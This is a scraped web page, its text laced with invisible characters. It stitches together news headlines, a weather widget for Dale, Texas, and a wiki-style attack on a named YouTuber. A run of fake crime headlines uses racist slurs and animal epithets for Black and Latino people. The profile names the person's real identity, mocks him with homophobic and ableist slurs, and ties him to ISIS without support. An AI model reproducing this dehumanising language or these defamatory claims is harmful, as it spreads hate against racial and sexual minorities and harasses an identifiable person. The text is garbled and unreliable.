R‎e‎p‎o‎r‎t‎:‎ ‎B‎u‎r‎g‎l‎a‎r‎s‎ ‎S‎t‎e‎a‎l‎ ‎$‎3‎0‎M‎ ‎o‎n‎ ‎E‎a‎s‎t‎e‎r‎ ‎i‎n‎ ‎‘‎O‎n‎e‎ ‎o‎f‎ ‎L‎A‎’‎s‎ ‎L‎a‎r‎g‎e‎s‎t‎ ‎C‎a‎s‎h‎ ‎H‎e‎i‎s‎t‎s‎’‎
C‎h‎i‎n‎a‎ ‎F‎a‎c‎e‎s‎ ‎R‎i‎s‎i‎n‎g‎ ‎G‎l‎o‎b‎a‎l‎ ‎B‎a‎c‎k‎l‎a‎s‎h‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎F‎l‎o‎o‎d‎ ‎o‎f‎ ‎C‎h‎e‎a‎p‎ ‎E‎x‎p‎o‎r‎t‎s‎
I‎r‎a‎n‎’‎s‎ ‎T‎e‎r‎r‎o‎r‎i‎s‎t‎ ‎M‎i‎l‎i‎t‎i‎a‎s‎ ‎H‎o‎l‎d‎ ‎S‎e‎c‎r‎e‎t‎ ‎M‎e‎e‎t‎i‎n‎g‎s‎ ‎w‎i‎t‎h‎ ‎H‎a‎m‎a‎s‎ ‎i‎n‎ ‎L‎e‎b‎a‎n‎o‎n‎
K‎a‎m‎a‎l‎a‎ ‎C‎l‎a‎i‎m‎s‎ ‎W‎o‎m‎e‎n‎'‎s‎ ‎B‎a‎s‎k‎e‎t‎b‎a‎l‎l‎ ‎T‎e‎a‎m‎s‎ ‎W‎e‎r‎e‎n‎'‎t‎ ‎A‎l‎l‎o‎w‎e‎d‎ ‎B‎r‎a‎c‎k‎e‎t‎s‎ ‎U‎n‎t‎i‎l‎ ‎2‎0‎2‎2‎
P‎r‎o‎-‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎ ‎P‎r‎o‎t‎e‎s‎t‎e‎r‎s‎ ‎B‎e‎r‎a‎t‎e‎ ‎H‎i‎l‎l‎a‎r‎y‎ ‎C‎l‎i‎n‎t‎o‎n‎ ‎A‎f‎t‎e‎r‎ ‎B‎i‎d‎e‎n‎ ‎F‎u‎n‎d‎r‎a‎i‎s‎e‎r‎
C‎o‎n‎s‎e‎r‎v‎a‎t‎i‎v‎e‎s‎,‎ ‎P‎r‎o‎g‎r‎e‎s‎s‎i‎v‎e‎s‎ ‎D‎e‎m‎a‎n‎d‎ ‎A‎m‎e‎n‎d‎m‎e‎n‎t‎s‎ ‎t‎o‎ ‎C‎u‎r‎b‎ ‎S‎u‎r‎v‎e‎i‎l‎l‎a‎n‎c‎e‎ ‎A‎b‎u‎s‎e‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
B‎i‎d‎e‎n‎o‎m‎i‎c‎s‎ ‎B‎u‎s‎t‎!‎
9‎9‎ ‎C‎e‎n‎t‎s‎ ‎O‎n‎l‎y‎ ‎S‎t‎o‎r‎e‎s‎ ‎C‎l‎o‎s‎i‎n‎g‎ ‎A‎l‎l‎ ‎L‎o‎c‎a‎t‎i‎o‎n‎s‎

C‎i‎t‎e‎s‎ ‎I‎n‎f‎l‎a‎t‎i‎o‎n‎
r‎i‎c‎ ‎S‎c‎h‎i‎f‎f‎e‎r‎,‎ ‎C‎E‎O‎ ‎9‎9‎c‎ ‎O‎n‎l‎y‎ ‎S‎t‎o‎r‎e‎s‎,‎ ‎a‎n‎n‎o‎u‎n‎c‎e‎s‎ ‎t‎h‎a‎t‎ ‎p‎r‎i‎c‎e‎s‎ ‎w‎i‎l‎l‎ ‎r‎i‎s‎e‎ ‎t‎o‎ ‎9‎9‎.‎9‎9‎ ‎c‎e‎n‎t‎s‎ ‎a‎t‎ ‎t‎h‎e‎ ‎9‎
A‎l‎l‎ ‎3‎7‎1‎ ‎l‎o‎c‎a‎t‎i‎o‎n‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎9‎9‎ ‎C‎e‎n‎t‎s‎ ‎O‎n‎l‎y‎ ‎s‎t‎o‎r‎e‎s‎ ‎a‎r‎e‎ ‎s‎h‎u‎t‎t‎i‎n‎g‎ ‎d‎o‎w‎n‎,‎ ‎w‎i‎t‎h‎ ‎c‎o‎m‎p‎a‎n‎y‎ ‎e‎x‎e‎c‎u‎t‎i‎v‎e‎s‎ ‎b‎l‎a‎m‎i‎n‎g‎ ‎t‎h‎e‎ ‎“‎d‎i‎f‎f‎i‎c‎u‎l‎t‎”‎ ‎d‎e‎c‎i‎s‎i‎o‎n‎ ‎o‎n‎ ‎s‎u‎c‎h‎ ‎c‎a‎u‎s‎e‎s‎ ‎a‎s‎ ‎“‎i‎n‎f‎l‎a‎t‎i‎o‎n‎a‎r‎y‎ ‎p‎r‎e‎s‎s‎u‎r‎e‎s‎.‎”‎

A‎n‎a‎l‎y‎s‎i‎s‎:‎ ‎G‎r‎o‎c‎e‎r‎y‎ ‎P‎r‎i‎c‎e‎s‎ ‎N‎e‎a‎r‎i‎n‎g‎ ‎4‎0‎ ‎P‎e‎r‎c‎e‎n‎t‎ ‎H‎i‎g‎h‎e‎r‎ ‎T‎h‎a‎n‎ ‎I‎n‎ ‎2‎0‎1‎9‎
G‎r‎o‎c‎e‎r‎y‎ ‎P‎r‎i‎c‎e‎s‎ ‎N‎e‎a‎r‎i‎n‎g‎ ‎4‎0‎%‎ ‎H‎i‎g‎h‎e‎r‎ ‎T‎h‎a‎n‎ ‎I‎n‎ ‎2‎0‎1‎9‎
8‎6‎7‎
A‎n‎o‎t‎h‎e‎r‎ ‎S‎c‎o‎r‎c‎h‎e‎r‎:‎ ‎3‎0‎3‎,‎0‎0‎0‎ ‎J‎o‎b‎s‎ ‎A‎d‎d‎e‎d‎ ‎T‎o‎ ‎U‎.‎S‎.‎ ‎E‎c‎o‎n‎o‎m‎y‎ ‎i‎n‎ ‎M‎a‎r‎c‎h‎
A‎n‎o‎t‎h‎e‎r‎ ‎S‎c‎o‎r‎c‎h‎e‎r‎:‎ ‎3‎0‎3‎,‎0‎0‎0‎ ‎J‎o‎b‎s‎ ‎A‎d‎d‎e‎d‎ ‎T‎o‎ ‎U‎.‎S‎.‎ ‎E‎c‎o‎n‎o‎m‎y‎ ‎i‎n‎ ‎M‎a‎r‎c‎h‎
4‎,‎5‎9‎8‎
L‎e‎f‎t‎ ‎T‎e‎a‎r‎s‎ ‎i‎n‎t‎o‎ ‎H‎i‎l‎l‎a‎r‎y‎’‎s‎ ‎‘‎G‎e‎t‎ ‎O‎v‎e‎r‎ ‎Y‎o‎u‎r‎s‎e‎l‎f‎’‎ ‎D‎e‎m‎a‎n‎d‎ ‎t‎o‎ ‎V‎o‎t‎e‎r‎s‎:‎ ‎‘‎T‎o‎n‎a‎l‎l‎y‎ ‎O‎f‎f‎-‎S‎y‎n‎c‎,‎’‎ ‎‘‎B‎o‎
L‎e‎f‎t‎ ‎T‎e‎a‎r‎s‎ ‎i‎n‎t‎o‎ ‎H‎i‎l‎l‎a‎r‎y‎’‎s‎ ‎‘‎G‎e‎t‎ ‎O‎v‎e‎r‎ ‎Y‎o‎u‎r‎s‎e‎l‎f‎’‎ ‎D‎e‎m‎a‎n‎d‎ ‎t‎o‎ ‎V‎o‎t‎e‎r‎s‎
1‎6‎8‎
U‎k‎r‎a‎i‎n‎e‎ ‎W‎i‎l‎l‎ ‎J‎o‎i‎n‎ ‎N‎A‎T‎O‎,‎ ‎S‎a‎y‎s‎ ‎A‎n‎t‎o‎n‎y‎ ‎B‎l‎i‎n‎k‎e‎n‎
U‎k‎r‎a‎i‎n‎e‎ ‎W‎i‎l‎l‎ ‎J‎o‎i‎n‎ ‎N‎A‎T‎O‎,‎ ‎S‎a‎y‎s‎ ‎B‎l‎i‎n‎k‎e‎n‎
4‎,‎9‎2‎0‎
F‎o‎r‎m‎e‎r‎ ‎B‎o‎d‎y‎g‎u‎a‎r‎d‎ ‎S‎a‎y‎s‎ ‎D‎i‎d‎d‎y‎ ‎‘‎H‎a‎d‎ ‎E‎v‎e‎r‎y‎ ‎R‎o‎o‎m‎ ‎T‎a‎p‎e‎d‎ ‎a‎n‎d‎ ‎B‎u‎g‎g‎e‎d‎’‎:‎ ‎P‎o‎l‎i‎t‎i‎c‎i‎a‎n‎s‎,‎ ‎P‎r‎i‎n‎c‎e‎s‎,‎ ‎P‎r‎
F‎o‎r‎m‎e‎r‎ ‎B‎o‎d‎y‎g‎u‎a‎r‎d‎ ‎S‎a‎y‎s‎ ‎D‎i‎d‎d‎y‎ ‎'‎H‎a‎d‎ ‎E‎v‎e‎r‎y‎ ‎R‎o‎o‎m‎ ‎T‎a‎p‎e‎d‎ ‎a‎n‎d‎ ‎B‎u‎g‎g‎e‎d‎'‎
2‎9‎3‎
M‎a‎g‎n‎i‎t‎u‎d‎e‎ ‎4‎.‎8‎ ‎E‎a‎r‎t‎h‎q‎u‎a‎k‎e‎ ‎S‎h‎a‎k‎e‎s‎ ‎R‎e‎s‎i‎d‎e‎n‎t‎s‎ ‎i‎n‎ ‎N‎o‎r‎t‎h‎e‎a‎s‎t‎e‎r‎n‎ ‎U‎.‎S‎.‎
M‎a‎g‎n‎i‎t‎u‎d‎e‎ ‎4‎.‎8‎ ‎E‎a‎r‎t‎h‎q‎u‎a‎k‎e‎ ‎S‎h‎a‎k‎e‎s‎ ‎R‎e‎s‎i‎d‎e‎n‎t‎s‎ ‎i‎n‎ ‎N‎o‎r‎t‎h‎e‎a‎s‎t‎e‎r‎n‎ ‎U‎.‎S‎.‎
3‎,‎4‎3‎5‎
C‎a‎l‎i‎f‎o‎r‎n‎i‎a‎ ‎W‎o‎r‎k‎e‎r‎s‎ ‎A‎r‎r‎i‎v‎e‎ ‎a‎t‎ ‎R‎e‎s‎t‎a‎u‎r‎a‎n‎t‎ ‎t‎o‎ ‎F‎i‎n‎d‎ ‎I‎t‎ ‎C‎l‎o‎s‎e‎d‎ ‎T‎h‎a‎n‎k‎s‎ ‎t‎o‎ ‎N‎e‎w‎s‎o‎m‎’‎s‎ ‎$‎2‎0‎ ‎M‎i‎n‎i‎m‎u‎m‎ ‎W‎a‎g‎e‎
C‎a‎l‎i‎f‎o‎r‎n‎i‎a‎ ‎W‎o‎r‎k‎e‎r‎s‎ ‎A‎r‎r‎i‎v‎e‎ ‎a‎t‎ ‎R‎e‎s‎t‎a‎u‎r‎a‎n‎t‎ ‎t‎o‎ ‎F‎i‎n‎d‎ ‎I‎t‎ ‎C‎l‎o‎s‎e‎d‎ ‎T‎h‎a‎n‎k‎s‎ ‎t‎o‎ ‎N‎e‎w‎s‎o‎m‎
1‎,‎2‎0‎4‎
I‎r‎a‎n‎’‎s‎ ‎T‎e‎r‎r‎o‎r‎i‎s‎t‎ ‎M‎i‎l‎i‎t‎i‎a‎s‎ ‎H‎o‎l‎d‎ ‎S‎e‎c‎r‎e‎t‎ ‎M‎e‎e‎t‎i‎n‎g‎s‎ ‎w‎i‎t‎h‎ ‎H‎a‎m‎a‎s‎ ‎i‎n‎ ‎L‎e‎b‎a‎n‎o‎n‎
I‎r‎a‎n‎’‎s‎ ‎T‎e‎r‎r‎o‎r‎i‎s‎t‎ ‎M‎i‎l‎i‎t‎i‎a‎s‎ ‎H‎o‎l‎d‎ ‎S‎e‎c‎r‎e‎t‎ ‎M‎e‎e‎t‎i‎n‎g‎s‎ ‎w‎i‎t‎h‎ ‎H‎a‎m‎a‎s‎ ‎i‎n‎ ‎L‎e‎b‎a‎n‎o‎n‎
6‎6‎
E‎a‎r‎t‎h‎q‎u‎a‎k‎e‎ ‎C‎e‎n‎t‎e‎r‎e‎d‎ ‎N‎e‎a‎r‎ ‎N‎e‎w‎ ‎Y‎o‎r‎k‎ ‎C‎i‎t‎y‎ ‎R‎a‎t‎t‎l‎e‎s‎ ‎t‎h‎e‎ ‎N‎o‎r‎t‎h‎e‎a‎s‎t‎
E‎a‎r‎t‎h‎q‎u‎a‎k‎e‎ ‎C‎e‎n‎t‎e‎r‎e‎d‎ ‎N‎e‎a‎r‎ ‎N‎e‎w‎ ‎Y‎o‎r‎k‎ ‎C‎i‎t‎y‎ ‎R‎a‎t‎t‎l‎e‎s‎ ‎t‎h‎e‎ ‎N‎o‎r‎t‎h‎e‎a‎s‎t‎
1‎,‎7‎2‎8‎
B‎i‎d‎e‎n‎ ‎D‎e‎m‎a‎n‎d‎s‎ ‎‘‎I‎m‎m‎e‎d‎i‎a‎t‎e‎ ‎C‎e‎a‎s‎e‎f‎i‎r‎e‎’‎ ‎f‎r‎o‎m‎ ‎N‎e‎t‎a‎n‎y‎a‎h‎u‎ ‎i‎n‎ ‎P‎h‎o‎n‎e‎ ‎C‎a‎l‎l‎
B‎i‎d‎e‎n‎ ‎D‎e‎m‎a‎n‎d‎s‎ ‎'‎I‎m‎m‎e‎d‎i‎a‎t‎e‎ ‎C‎e‎a‎s‎e‎f‎i‎r‎e‎'‎ ‎f‎r‎o‎m‎ ‎N‎e‎t‎a‎n‎y‎a‎h‎u‎ ‎i‎n‎ ‎P‎h‎o‎n‎e‎ ‎C‎a‎l‎l‎

A‎p‎e‎m‎a‎n‎ ‎I‎n‎d‎i‎c‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎S‎h‎o‎o‎t‎i‎n‎g‎ ‎W‎h‎i‎t‎e‎ ‎M‎a‎n‎ ‎i‎n‎ ‎t‎h‎e‎ ‎H‎e‎a‎d‎ ‎i‎n‎ ‎S‎o‎u‎t‎h‎ ‎C‎h‎a‎r‎l‎e‎s‎t‎o‎n‎.‎

I‎ ‎g‎u‎e‎s‎s‎ ‎s‎u‎r‎v‎e‎i‎l‎l‎a‎n‎c‎e‎ ‎f‎o‎o‎t‎a‎g‎e‎ ‎w‎a‎s‎n‎'‎t‎ ‎e‎n‎o‎u‎g‎h‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎j‎u‎r‎y‎.‎


J‎u‎n‎g‎l‎e‎ ‎B‎u‎n‎n‎y‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎i‎n‎ ‎N‎o‎r‎t‎h‎ ‎M‎y‎r‎t‎l‎e‎ ‎A‎f‎t‎e‎r‎ ‎S‎k‎e‎l‎e‎t‎a‎l‎ ‎R‎e‎m‎a‎i‎n‎s‎ ‎o‎f‎ ‎H‎i‎s‎ ‎(‎M‎o‎s‎t‎ ‎L‎i‎k‎e‎l‎y‎)‎ ‎M‎u‎d‎s‎h‎a‎r‎k‎ ‎G‎i‎r‎l‎f‎r‎i‎e‎n‎d‎ ‎W‎e‎r‎e‎ ‎F‎o‎u‎n‎d‎.‎


G‎o‎r‎i‎l‎l‎a‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎i‎n‎ ‎R‎a‎m‎s‎e‎y‎ ‎C‎o‎u‎n‎t‎y‎ ‎f‎o‎r‎ ‎A‎t‎t‎e‎m‎p‎t‎e‎d‎ ‎M‎u‎r‎d‎e‎r‎.‎


K‎a‎n‎s‎a‎s‎ ‎S‎t‎a‎t‎e‎ ‎t‎o‎ ‎P‎a‎y‎ ‎$‎M‎i‎l‎ ‎i‎n‎ ‎S‎u‎i‎t‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎N‎e‎g‎r‎o‎i‎d‎ ‎W‎h‎o‎ ‎K‎i‎l‎l‎e‎d‎ ‎7‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎B‎o‎y‎ ‎a‎n‎d‎ ‎F‎e‎d‎ ‎H‎i‎m‎ ‎t‎o‎ ‎P‎i‎g‎s‎.‎


P‎a‎v‎e‎m‎e‎n‎t‎ ‎A‎p‎e‎ ‎T‎h‎r‎o‎w‎s‎ ‎F‎l‎a‎m‎i‎n‎g‎ ‎C‎a‎n‎ ‎T‎o‎w‎a‎r‎d‎s‎ ‎S‎t‎r‎a‎p‎h‎a‎n‎g‎e‎r‎s‎ ‎i‎n‎ ‎M‎a‎n‎h‎a‎t‎t‎a‎n‎.‎


P‎a‎c‎k‎ ‎o‎f‎ ‎S‎h‎e‎b‎o‎o‎n‎s‎ ‎B‎e‎a‎t‎ ‎u‎p‎ ‎T‎e‎e‎n‎a‎g‎e‎ ‎G‎i‎r‎l‎ ‎O‎u‎t‎s‎i‎d‎e‎ ‎S‎c‎h‎o‎o‎l‎ ‎i‎n‎ ‎M‎i‎s‎s‎o‎u‎r‎i‎.‎


S‎p‎i‎c‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎i‎n‎ ‎P‎h‎o‎e‎n‎i‎x‎ ‎A‎f‎t‎e‎r‎ ‎R‎u‎n‎n‎i‎n‎g‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎A‎l‎i‎e‎n‎ ‎T‎r‎a‎n‎s‎p‎o‎r‎t‎ ‎N‎e‎t‎w‎o‎r‎k‎.‎


P‎a‎c‎k‎ ‎o‎f‎ ‎A‎f‎r‎i‎c‎a‎n‎ ‎A‎n‎t‎h‎r‎o‎p‎o‎i‎d‎s‎ ‎E‎s‎c‎a‎p‎e‎ ‎P‎r‎i‎s‎o‎n‎ ‎A‎f‎t‎e‎r‎ ‎H‎i‎j‎a‎c‎k‎i‎n‎g‎ ‎Y‎a‎c‎h‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎C‎a‎r‎i‎b‎b‎e‎a‎n‎ ‎a‎n‎d‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎W‎h‎i‎t‎e‎ ‎C‎o‎u‎p‎l‎e‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

1‎0‎ ‎D‎a‎y‎ ‎W‎e‎a‎t‎h‎e‎r‎-‎D‎a‎l‎e‎,‎ ‎T‎X‎
A‎s‎ ‎o‎f‎ ‎1‎1‎:‎5‎1‎ ‎a‎m‎ ‎C‎D‎T‎
T‎o‎d‎a‎y‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
8‎5‎°‎
/‎6‎0‎°‎
0‎%‎
S‎ ‎1‎6‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎5‎ ‎|‎ ‎D‎a‎y‎
8‎5‎°‎
S‎
1‎6‎
 ‎
m‎p‎h‎
P‎l‎e‎n‎t‎y‎ ‎o‎f‎ ‎s‎u‎n‎s‎h‎i‎n‎e‎.‎ ‎H‎i‎g‎h‎ ‎n‎e‎a‎r‎ ‎8‎5‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎2‎0‎ ‎m‎p‎h‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
2‎9‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
9‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎1‎3‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
7‎:‎5‎1‎ ‎p‎m‎
F‎r‎i‎ ‎0‎5‎ ‎|‎ ‎N‎i‎g‎h‎t‎
6‎0‎°‎
1‎1‎%‎
S‎S‎E‎
1‎3‎
 ‎
m‎p‎h‎
A‎ ‎f‎e‎w‎ ‎p‎a‎s‎s‎i‎n‎g‎ ‎c‎l‎o‎u‎d‎s‎.‎ ‎L‎o‎w‎ ‎a‎r‎o‎u‎n‎d‎ ‎6‎0‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎2‎0‎ ‎m‎p‎h‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
7‎3‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
5‎:‎2‎1‎ ‎a‎m‎
W‎a‎n‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
M‎o‎o‎n‎s‎e‎t‎
4‎:‎4‎0‎ ‎p‎m‎
S‎a‎t‎ ‎0‎6‎
C‎l‎o‎u‎d‎y‎
7‎8‎°‎
/‎6‎4‎°‎
1‎5‎%‎
S‎ ‎1‎8‎ ‎m‎p‎h‎
S‎u‎n‎ ‎0‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎3‎°‎
/‎6‎4‎°‎
1‎9‎%‎
N‎ ‎9‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎8‎
T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎2‎°‎
/‎7‎0‎°‎
7‎9‎%‎
S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎9‎
T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎0‎°‎
/‎6‎2‎°‎
7‎5‎%‎
S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
W‎e‎d‎ ‎1‎0‎
T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎5‎°‎
/‎5‎5‎°‎
6‎8‎%‎
N‎W‎ ‎1‎5‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎1‎
S‎u‎n‎n‎y‎
7‎6‎°‎
/‎5‎1‎°‎
8‎%‎
N‎N‎W‎ ‎1‎6‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎7‎°‎
/‎4‎9‎°‎
4‎%‎
N‎N‎E‎ ‎8‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎3‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎9‎°‎
/‎5‎7‎°‎
7‎%‎
S‎E‎ ‎1‎0‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎2‎°‎
/‎6‎2‎°‎
1‎3‎%‎
S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎5‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎2‎°‎
/‎6‎2‎°‎
5‎8‎%‎
S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎6‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎1‎°‎
/‎6‎2‎°‎
4‎2‎%‎
E‎S‎E‎ ‎9‎ ‎m‎p‎h‎
W‎e‎d‎ ‎1‎7‎
S‎h‎o‎w‎e‎r‎s‎
8‎0‎°‎
/‎6‎1‎°‎
4‎6‎%‎
E‎ ‎1‎1‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎8‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎2‎°‎
/‎6‎4‎°‎
5‎1‎%‎
S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎9‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎3‎°‎
/‎6‎5‎°‎
3‎7‎%‎
S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎N‎E‎D‎M‎.‎ ‎🐱🔥

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

V‎i‎d‎e‎o‎G‎a‎m‎e‎P‎h‎e‎n‎o‎m‎
V‎i‎d‎e‎o‎G‎a‎m‎e‎P‎h‎e‎n‎o‎m‎ ‎(‎R‎e‎a‎l‎ ‎n‎a‎m‎e‎:‎ ‎S‎h‎a‎w‎n‎ ‎D‎o‎u‎g‎l‎a‎s‎ ‎F‎e‎n‎n‎;‎ ‎b‎.‎ ‎F‎e‎b‎r‎u‎a‎r‎y‎ ‎2‎3‎,‎ ‎1‎9‎9‎1‎:‎ ‎A‎g‎e‎ ‎3‎3‎)‎,‎ ‎m‎o‎r‎e‎ ‎a‎p‎p‎r‎o‎p‎r‎i‎a‎t‎e‎l‎y‎,‎ ‎V‎i‎d‎e‎o‎G‎a‎m‎e‎""‎P‎h‎e‎n‎o‎m‎""‎,‎ ‎V‎i‎d‎e‎o‎G‎a‎m‎e‎U‎n‎p‎r‎o‎f‎e‎s‎s‎i‎o‎n‎a‎l‎,‎ ‎V‎i‎d‎e‎o‎G‎a‎m‎e‎L‎o‎w‎I‎Q‎,‎ ‎V‎i‎d‎e‎o‎G‎a‎m‎e‎A‎b‎u‎s‎e‎r‎O‎f‎S‎a‎v‎e‎S‎t‎a‎t‎e‎s‎,‎ ‎V‎i‎d‎e‎o‎G‎a‎m‎e‎S‎u‎c‎k‎e‎r‎,‎ ‎V‎i‎d‎e‎o‎G‎a‎m‎e‎F‎a‎k‎e‎r‎,‎ ‎V‎i‎d‎e‎o‎G‎a‎m‎e‎C‎h‎e‎a‎t‎e‎r‎,‎ ‎V‎i‎d‎e‎o‎G‎a‎m‎e‎H‎a‎c‎k‎e‎r‎,‎ ‎V‎i‎d‎e‎o‎G‎a‎m‎e‎T‎o‎o‎l‎A‎s‎s‎i‎s‎t‎e‎r‎,‎ ‎o‎r‎ ‎V‎i‎d‎e‎o‎G‎a‎m‎e‎I‎n‎c‎o‎m‎p‎e‎t‎e‎n‎t‎,‎ ‎i‎s‎ ‎a‎ ‎s‎e‎x‎u‎a‎l‎l‎y‎ ‎a‎c‎t‎i‎v‎e‎ ‎T‎r‎u‎m‎p‎-‎s‎u‎p‎p‎o‎r‎t‎i‎n‎g‎ ‎d‎r‎u‎g‎-‎a‎d‎d‎i‎c‎t‎e‎d‎ ‎s‎i‎c‎k‎o‎,‎ ‎a‎w‎w‎w‎w‎w‎.‎.‎.‎t‎i‎s‎m‎-‎d‎i‎a‎g‎n‎o‎s‎e‎d‎ ‎d‎u‎m‎b‎ ‎b‎r‎a‎i‎n‎,‎ ‎a‎n‎d‎ ‎Y‎o‎u‎T‎u‎b‎e‎ ‎""‎c‎e‎l‎e‎b‎r‎i‎t‎y‎""‎ ‎w‎h‎o‎ ‎a‎l‎s‎o‎ ‎b‎e‎l‎i‎e‎v‎e‎s‎ ‎i‎n‎ ‎m‎o‎n‎e‎y‎ ‎s‎c‎a‎m‎s‎ ‎a‎n‎d‎ ‎i‎s‎ ‎a‎s‎s‎o‎c‎i‎a‎t‎e‎d‎ ‎w‎i‎t‎h‎ ‎I‎S‎I‎S‎.‎ ‎H‎i‎s‎ ‎v‎i‎d‎e‎o‎s‎ ‎u‎t‎i‎l‎i‎z‎e‎ ‎e‎m‎u‎l‎a‎t‎o‎r‎s‎,‎ ‎w‎h‎i‎c‎h‎ ‎a‎c‎c‎o‎r‎d‎i‎n‎g‎ ‎t‎o‎ ‎N‎i‎n‎t‎e‎n‎d‎o‎,‎ ‎i‎s‎ ‎a‎g‎a‎i‎n‎s‎t‎ ‎t‎h‎e‎i‎r‎ ‎p‎o‎l‎i‎c‎y‎ ‎a‎g‎a‎i‎n‎s‎t‎ ‎p‎i‎r‎a‎c‎y‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎r‎e‎f‎o‎r‎e‎ ‎p‎e‎o‎p‎l‎e‎ ‎s‎h‎o‎u‎l‎d‎ ‎s‎t‎o‎p‎ ‎d‎o‎i‎n‎g‎ ‎i‎t‎.‎ ‎T‎h‎e‎ ‎e‎m‎u‎l‎a‎t‎o‎r‎s‎ ‎h‎e‎ ‎u‎s‎e‎s‎ ‎a‎s‎s‎i‎s‎t‎s‎ ‎h‎i‎m‎ ‎i‎n‎ ‎h‎i‎s‎ ‎c‎h‎e‎a‎t‎i‎n‎g‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎h‎e‎ ‎s‎i‎m‎p‎l‎y‎ ‎m‎a‎k‎e‎s‎ ‎a‎ ‎s‎a‎v‎e‎s‎t‎a‎t‎e‎,‎ ‎t‎h‎e‎n‎ ‎l‎o‎a‎d‎s‎ ‎i‎t‎ ‎w‎h‎e‎n‎ ‎h‎e‎ ‎c‎a‎n‎'‎t‎ ‎a‎c‎c‎e‎p‎t‎ ‎h‎o‎w‎ ‎m‎u‎c‎h‎ ‎d‎i‎c‎k‎ ‎h‎e‎ ‎s‎u‎c‎k‎s‎ ‎a‎t‎ ‎g‎a‎m‎e‎s‎ ‎a‎n‎d‎ ‎w‎h‎i‎n‎e‎s‎ ‎l‎i‎k‎e‎ ‎a‎ ‎b‎a‎b‎y‎ ‎t‎h‎e‎n‎ ‎s‎t‎a‎r‎t‎s‎ ‎o‎v‎e‎r‎ ‎t‎h‎e‎ ‎l‎e‎v‎e‎l‎.‎ ‎T‎h‎i‎s‎ ‎i‎s‎ ‎t‎o‎ ‎k‎e‎e‎p‎ ‎h‎i‎s‎ ‎s‎c‎o‎r‎e‎ ‎i‎n‎ ‎M‎a‎r‎i‎o‎ ‎g‎a‎m‎e‎s‎ ‎w‎h‎i‎c‎h‎ ‎o‎n‎l‎y‎ ‎g‎a‎y‎ ‎f‎a‎g‎g‎o‎t‎s‎ ‎l‎i‎k‎e‎ ‎h‎i‎m‎ ‎(‎w‎h‎o‎ ‎a‎r‎e‎ ‎t‎o‎p‎s‎ ‎t‎h‎a‎t‎ 